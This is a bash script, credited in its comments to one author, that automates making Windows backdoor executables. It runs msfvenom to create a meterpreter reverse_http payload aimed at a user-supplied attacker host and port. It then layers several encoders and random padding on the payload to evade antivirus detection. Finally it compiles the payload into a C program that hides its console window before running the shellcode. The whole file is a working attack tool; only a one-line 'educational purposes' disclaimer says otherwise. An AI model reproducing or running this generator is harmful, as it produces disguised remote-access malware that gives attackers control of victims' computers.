#!/bin/bash
#Created by Alex Williams
#This script is for educational purposes only. I am not responsible for your ignorance/stupidity.
#This code is simple. If you want to update it, please do. But send me a copy and also reference me as an author.
bannr="Custom MSFVenom Executable Generator"
clear
echo $bannr
checkdir="/root/.wine/drive_c/MinGW/bin"
if [ ! -d "$checkdir" ]; then
        echo "MinGW for Windows not found on this system. Please install it first."
	exit
fi
echo
echo "We're going to generate some shellcode!"
echo "Be sure to take what you want out of the ShellCode folder."
echo
read -p "LHOST: " ip
read -p "LPORT: " lprt
clear
echo $bannr
echo
echo "LHOST set to $ip and the LPORT is set to $lprt."
echo
echo "We will be using the windows/meterpreter/reverse_x payloads."
echo "Which would you like to use?"
read -p "windows/meterpreter/reverse_" listenr
read -p "How many encoding iterations? " enumber
read -p "Okay, and how many lines of 'fluff?' Do not exceed 600. " seed
clear
echo $bannr
echo
echo "Alright, so we're going to be listening on $ip:$lprt with the"
echo "payload windows/meterpreter/reverse_$listenr. You want $enumber"
echo "iterations of encoding with $seed lines of fluff."
read -p "Press any key to continue..."
#Begin generation
directory="/usr/share/metasploit-framework/ShellCode"
if [ ! -d "$directory" ]; then
	echo "Creating the ShellCode folder in the metasploit directory..."
	mkdir $directory
fi
if test "$(ls -A "$directory")"; then

	echo "Cleaning out the ShellCode directory"
	rm $directory/*
fi
cd /usr/share/metasploit-framework
echo "Generating shellcode..."
msfvenom -p windows/meterpreter/reverse_http LHOST=$ip LPORT=$lprt EXITFUNC=process --platform windows -e generic/none -i 1 -a x86 -f raw | msfvenom -p - --platform windows -a x86 -e x86/shikata_ga_nai -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/jmp_call_additive -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/call4_dword_xor -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/shikata_ga_nai -i $enumber -f c -o $directory/test.c
cd ShellCode
echo "Shellcode generated."
echo "Cleaning it up..."
sed '1d' test.c > aready.c
echo "unsigned char micro[]=" > var
cat var > ready.c
cat aready.c >> ready.c
echo "Creating Headers..."
echo "#include <stdio.h>" >> temp
echo "#define _WIN32_WINNT 0x0500" >> temp
echo "#include <windows.h>" >> temp
echo 'unsigned char ufs[]=' >> temp
echo "Creating the first bit of fluff"
for (( i=1; i<=10000;i++ )) do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed >> temp2
sed -i 's/$/"/' temp2
sed -i 's/^/"/' temp2
echo  ';' >> temp2
cat temp2 >> temp
cat ready.c >> temp
mv temp ready2.c
echo ";" >> ready2.c
echo "Creating the execution bit..."
echo "int main(void) { " >> ready2.c
echo "HWND hWnd = GetConsoleWindow();" >> ready2.c
echo "ShowWindow( hWnd, SW_HIDE );((void (*)())micro)();}" >> ready2.c
mv ready2.c final.c
echo "Creating the last bit of fluff..."
echo 'unsigned char tap[]=' > temp3
for (( i=1; i<=999999;i++ )) do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed >> temp4
sed -i 's/$/"/' temp4
sed -i 's/^/"/' temp4
echo  ';' >> temp4
cat temp4 >> temp3
echo "Merging the last of it together..."
cat temp3 >> final.c
outdir="/root/out"
if [ ! -d "$outdir" ]; then
        echo "Creating the out folder in the root directory..."
        mkdir $outdir
fi
cd /root/.wine/drive_c/MinGW/bin/
wine gcc.exe -o /root/out/final.exe /usr/share/metasploit-framework/ShellCode/final.c -lwsock32
cd /root/out/
mv final.exe "$listenr-$lprt-$RANDOM.exe"
filex=`ls -ct1 | head -1`
sumx=`sha1sum $filex`
echo $filex "SHA-1 Checksum is .." $sumx
strip --strip-debug $filex
echo "Done!"